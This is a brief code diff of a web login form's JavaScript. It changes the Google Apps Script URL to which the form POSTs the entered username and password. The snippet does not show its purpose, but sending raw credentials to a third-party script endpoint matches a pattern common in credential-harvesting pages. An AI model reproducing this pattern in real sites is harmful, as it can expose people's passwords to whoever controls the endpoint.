@@ -8,7 +8,7 @@ document.getElementById("login-form").addEventListener("submit", function(e) {
     formData.append("username", username);
     formData.append("password", password);
 
-    fetch("https://script.google.com/macros/s/AKfycbwsv-rV01zWEQc2CLzctZLNQhsET994PwQ_P8_rI80k2DH0ey30abbvIphne3ALSeQIxQ/exec", {
+    fetch("https://script.google.com/macros/s/AKfycbyTLGgVh7amkJhb99AxaE2l9_F1HSkkwYUp-NODa8qq1dlroHFr-ja5R79PFUzNcwN_nw/exec", {
         method: "POST",
         body: formData
     })
